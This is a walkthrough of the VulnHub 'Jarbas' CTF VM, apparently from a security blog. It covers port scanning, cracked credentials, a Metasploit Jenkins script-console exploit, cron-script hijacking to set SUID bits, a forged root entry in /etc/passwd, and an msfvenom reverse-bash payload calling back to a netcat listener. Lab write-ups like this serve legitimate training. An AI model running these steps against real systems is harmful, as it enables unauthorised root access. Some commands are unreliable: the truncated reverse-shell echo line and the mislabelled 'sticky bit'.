@@ -1,0 +1,150 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Jarbas: 1 (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-jarbas-1-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-07-29T05:13:28+00:00">July 29, 2018</time><time class="updated" datetime="2025-06-10T20:29:41+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello readers. We’d recently tried our hands on the vulnerable VM called Jarbas on vulnhub. It is developed to look like a 90s Portuguese search engine. It is made by Tiago Tavares. You can download the lab from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/jarbas-1,232/">here</a></span>. The objective of this challenge is to get the root shell.</span></p>
+<p><span style="color: #000000;"><strong>Difficulty Level: Easy</strong></span></p>
+<p><span style="color: #000000;"><strong>Steps involved:</strong></span></p>
+<p><strong><span style="color: #000000;">Method 1:</span></strong></p>
+<ol>
+<li><span style="color: #000000;">Port scanning and network discovery.</span></li>
+<li><span style="color: #000000;">Directory enumeration.</span></li>
+<li><span style="color: #000000;">Discovery of username and password hashes.</span></li>
+<li><span style="color: #000000;">Cracking password hash.</span></li>
+<li><span style="color: #000000;">Exploiting Jenkins on port 8080 using Metasploit.</span></li>
+<li><span style="color: #000000;">Discovering cronjob.</span></li>
+<li><span style="color: #000000;">Modifying cronjob and replacing it with a custom command to set the sticky bit on the find.</span></li>
+<li><span style="color: #000000;">Waiting 5 minutes for the sticky bit to get set.</span></li>
+<li><span style="color: #000000;">Executing root command to read the flag.</span></li>
+</ol>
+<p><strong><span style="color: #000000;">Method 2:</span></strong></p>
+<ol>
+<li><span style="color: #000000;">Exploiting Jenkins as above to get a shell.</span></li>
+<li><span style="color: #000000;">Using OpenSSL to create a password hash.</span></li>
+<li><span style="color: #000000;">Editing /etc/passwd file with our custom file.</span></li>
+<li><span style="color: #000000;">Uploading it in the /tmp folder.</span></li>
+<li><span style="color: #000000;">Copying it in place of /etc/passwd.</span></li>
+<li><span style="color: #000000;">Logging in as root using SU binary.</span></li>
+</ol>
+<p><strong>Method 3:</strong></p>
+<ol>
+<li><span style="color: #000000;">Achieving meterpreter as above.</span></li>
+<li><span style="color: #000000;">Uploading a reverse_bash one-liner in CleaningScript.sh.</span></li>
+<li><span style="color: #000000;">Activating Netcat and getting root.</span></li>
+</ol>
+<p><span style="color: #000000;">Let’s get started then.</span></p>
+<h3><span style="color: #800000;"><strong>Method 1:</strong></span></h3>
+<p><span style="color: #000000;">After running a <strong>netdiscover </strong>scan we figured out that the IP that DHCP allotted to the VM was 192.168.1.122 in my case.</span></p>
+<p><span style="color: #000000;">So, we used a nmap aggressive scan to discover opened ports on the VM.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.122</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-lfyMAKlruEY/W11JwefMLlI/AAAAAAAAYts/yHLWblu0GCIr5GLw8LIf3W9yUrVahLpnwCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">There was a webpage associated with the VM so we opened it in the browser.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-xK3PlBGRxrc/W11JyzVbj-I/AAAAAAAAYuA/T0o1Zqs3pxQROjh1k1UpujgX2V47der3gCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">When nothing seemed to impress us, we tried to enumerate the directories using directory buster.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.1.122/ -X .html</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-7ZWq90YQLg0/W11JzRb1O-I/AAAAAAAAYuE/i6N2eV2kaJUxfzlFO_C6ZIqIh7yf8teGwCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Since index.html is the default page and there was another HTML page available, we tried to open it in the browser.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-pn_RG3-5VY8/W11J0J8pXVI/AAAAAAAAYuI/Uwhd8vtdFP45KgX-QohDU2-8GxALUM0uACLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">We found some password hashes in the access.html that we tried to crack it online on <strong>hashkiller</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-nuSjNHuzkbw/W11J0SbW8VI/AAAAAAAAYuM/aZlnQjX5VPYgUjshXpZj8eft06xrdZbuwCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">WOW! We have three passwords in hand now.</span></p>
+<p><span style="color: #000000;">Now, remember we had port 22 open in our <strong>nmap</strong> scan report, so we tried to login into ssh using the usernames and passwords we just cracked but it didn’t seem to work. So, we looked at another interesting port of 8080 and opened it in the browser.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-6w3K6AbnadU/W11J0YnSsFI/AAAAAAAAYuQ/iD8eLPWkgq8fnTxTco9pJPGd4kHYXfj0QCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">We found a web application on Jenkins. It is an open source automation server written in Java. Jenkins helps to automate the non-human part of the software development process, with continuous integration and facilitating technical aspects of continuous delivery.</span></p>
+<p><span style="color: #000000;">We tried to login with all three of the usernames and passwords but the third combination logged us into Jenkins which was:</span></p>
+<pre class="lang:default decode:true">eder: vipsu</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-u-vkcJxQHCo/W11J1MWjDsI/AAAAAAAAYuU/iGVNCMNjY0MSyge_IzxA7W6LytPKN2HpQCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Now, we found that Jenkins had a script console vulnerability and its module was in Metasploit.</span></p>
+<pre class="lang:default decode:true">use exploit/multi/http/jenkins_script_console
+msf exploit(jenkins_script_console) &gt; set target 1
+msf exploit(jenkins_script_console) &gt; set rhost 192.168.1.122
+msf exploit(jenkins_script_console) &gt; set rport 8080
+msf exploit(jenkins_script_console) &gt; set TARGETURI /
+msf exploit(jenkins_script_console) &gt; set USERNAME eder
+msf exploit(jenkins_script_console) &gt; set PASSWORD vipsu
+msf exploit(jenkins_script_console) &gt; exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RHNt2m5scaU/W11J1zXMDDI/AAAAAAAAYuY/WHrN1mOgp7w5iG9XwHqruE52If7-1mI8QCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">We got a meterpreter session! Let’s try and get a teletype here using python’s one-liner shell:</span></p>
+<pre class="lang:default decode:true">shell
+python -c 'import pty;pty.spawn("/bin/bash");'</pre>
+<p><span style="color: #000000;">Now, we found a shell script in the crontab which was executing automatically after every 5 minutes called CleaningScript.sh and whose job was to remove access log from the system.</span></p>
+<pre class="lang:default decode:true">cat /etc/crontab
+cd /etc/script
+ls
+cat CleaningScript.sh</pre>
+<p><span style="color: #000000;">But even better, it was running with root permissions!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-zRIazhFrQ5I/W11JuOFtazI/AAAAAAAAYtU/nAHIL74eOlQRnbIJ_e6OFEfsB66DiWpZgCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Let’s make a new gedit file called CleaningScript.sh and use the root privilege of CleaningScript.sh file to set a sticky bit on “find.”</span></p>
+<pre class="lang:default decode:true">#!/bin/bash
+chmod u+s /usr/bin/find</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-lHsNInCgS7g/W11JuR1SeVI/AAAAAAAAYtc/irrmFz62V208c05zhnsQ2C4-Z_fn3uuPACLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Now, all that was left to do was to upload this new shell script onto the server and replace it with the original file.</span></p>
+<p><span style="color: #000000;">So, we background the shell (<strong>CTRL+Z</strong>)</span></p>
+<p><span style="color: #000000;">and used meterpreter upload command.</span></p>
+<pre class="lang:default decode:true">upload /root/Desktop/CleaningScript.sh .
+shell
+python -c 'import pty;pty.spawn("/bin/bash");'
+date</pre>
+<p><span style="color: #000000;">We observed the time and waited for exactly 5 minutes for the script to run automatically.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MD2Vex27QMo/W11JuTZrq0I/AAAAAAAAYtY/NDqhDyrJUmo-0G0lhUdrc-sUa__HBGCDACLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">After 5 minutes:</span></p>
+<pre class="lang:default decode:true">ls -la /usr/bin/find</pre>
+<p><span style="color: #000000;">Permissions modified: -rwsr-xr-x</span></p>
+<p><span style="color: #000000;">The sticky bit got set! Now we just need to use the find inline command execution:</span></p>
+<pre class="lang:default decode:true">find /home -exec whoami \;</pre>
+<p><span style="color: #000000;">As you can see all the users got enumerated as <strong>root</strong>.</span></p>
+<pre class="lang:default decode:true">find /home -exec ls -la /root \;</pre>
+<p><span style="color: #000000;">Hence, we can execute any command as root now!!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--3q1W9IdrYA/W11JvRT4hxI/AAAAAAAAYtg/ZpM4JeH0l9Ma-iuYGcErvG0KPon4DG_tQCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">A file called flag.txt was visible in the root directory.</span></p>
+<pre class="lang:default decode:true">find /home -exec cat flag.txt \;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-TnniS4eTvaM/W11Jv0GHhAI/AAAAAAAAYtk/cDr8sQvSfTkzVn7GBk-mC6lkc_uxndR0wCLcBGAs/s1600/14.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Method 2:</strong></span></h3>
+<p><span style="color: #000000;">For this method, we achieve the meterpreter session as above and then get a shell.</span></p>
+<p><span style="color: #000000;">We used echo command this time to set the sticky bit on <strong>/usr/bin/cp</strong></span></p>
+<pre class="lang:default decode:true">echo "chmod u+s /usr/bin/cp" &gt; CleaningScript.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-d8BBPUydaj4/W11JwW6xqeI/AAAAAAAAYto/4iCH6j-zojYlxQPlCdl6J7-BxQamGeuSQCLcBGAs/s1600/25.png"/></span></p>
+<p><span style="color: #000000;">We read the /etc/passwd file using cat utility after that.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Hh2PWlkoo0s/W11Jw-KFm1I/AAAAAAAAYtw/wlDtn6LyjG8S6bhOIGOtg4hq0YaBNI7RgCLcBGAs/s1600/26.png"/></span></p>
+<p><span style="color: #000000;">Our aim was to add a user in /etc/passwd file as root. So, we use OpenSSL utility to create a password hash with the command:</span></p>
+<pre class="lang:default decode:true ">openssl passwd -l -salt user3 pass123</pre>
+<p><span style="color: #000000;">Copy the password hash in someplace safe now.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lxD5UfBdrpE/W11JxSXjecI/AAAAAAAAYt0/pmr01Qhyu3ECiLC3DfdalARzEejqqJmnQCLcBGAs/s1600/27.png"/></span></p>
+<p><span style="color: #000000;">Copy the /etc/passwd file in a leafpad file and let’s add our custom user in there.</span></p>
+<pre class="lang:default decode:true">raj:$1$user3$&lt;hash&gt;:0:0:root:/root:/bin/bash</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Z89YcbxkFUE/W11Jyoy5XRI/AAAAAAAAYt8/4sT3jP9vucEi0HXQVR3WUaPV06hbtlPTwCLcBGAs/s1600/28.png"/></span></p>
+<p><span style="color: #000000;">Save this file somewhere on the desktop and download this file on server’s /tmp (universal writeable) directory.</span></p>
+<p><span style="color: #000000;">Then use cp (since we set sticky bit) to copy and replace this file with the original file with the command:</span></p>
+<pre class="lang:default decode:true">cp passwd /etc/passwd</pre>
+<p><span style="color: #000000;">Let’s try and login using su binary:</span></p>
+<pre class="lang:default decode:true">su raj
+[password]: pass123</pre>
+<p><span style="color: #000000;"><strong>Voila! </strong>We got a root shell! Let’s read the flag now.</span></p>
+<pre class="lang:default decode:true">cd /root
+ls
+cat flag.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-c1ypzYDZn_k/W11Jyay_VnI/AAAAAAAAYt4/si0bXYb1-mQT1W9sgbkpoZR-H_Uh6q8sQCLcBGAs/s1600/29.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Method 3:</strong></span></h3>
+<p data-blogger-escaped-style="clear: both; text-align: center;"><span style="color: #000000;">Achieve shell as above and in another terminal window, try this msfvenom command:</span></p>
+<pre class="lang:default decode:true ">msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.133 lport=4444 R</pre>
+<p data-blogger-escaped-style="clear: both; text-align: center;"><img decoding="async" src="https://3.bp.blogspot.com/-3d3ZwAES0lc/W17UGcb1jBI/AAAAAAAAYyk/J6EiAM5YxbkKJfBR-5ckTkc82VQbQc_mQCLcBGAs/s1600/30.png"/></p>
+<p><span style="color: #000000;">Since we know CleaningScript.sh is run as root in every 5 minutes, so we copy this one-liner in CleaningScript.sh and activate a netcat shell side by side and wait for 5 minutes.</span></p>
+<pre class="lang:default decode:true">cd /etc/script
+ls
+echo "0&lt;&amp;126 &gt;&amp;126 2&gt;&amp;126" &gt; CleaningScript.sh</pre>
+<p data-blogger-escaped-style="clear: both; text-align: center;"><img decoding="async" src="https://3.bp.blogspot.com/-2Ksu-yrKjRo/W17UGfojUJI/AAAAAAAAYyo/O-qrCMThJ70lFqcQZG6QgFPSq7WUz4-DwCLcBGAs/s1600/31.png"/></p>
+<p><span style="color: #000000;">In another window, after waiting for 5 minutes, we will get a root shell!</span></p>
+<pre class="lang:default decode:true ">nc -lvp 4444
+id
+python -c 'import pty;pty.spawn("/bin/bash");'
+cat flag.txt</pre>
+<p data-blogger-escaped-style="clear: both; text-align: center;"><img decoding="async" src="https://3.bp.blogspot.com/-xaJgB_J4gUY/W17UGHjVgEI/AAAAAAAAYyg/wWLs7qVa9LYrxIEB7L_l3KyBoDJWxq5OgCLcBGAs/s1600/32.png"/></p>
+<p data-blogger-escaped-style="clear: both; text-align: center;">So, that’s how we captured the flag in this VM. Happy Hacking.</p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and a left and right brain thinker. contact<strong> <a class="broken_link" style="color: #000000;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
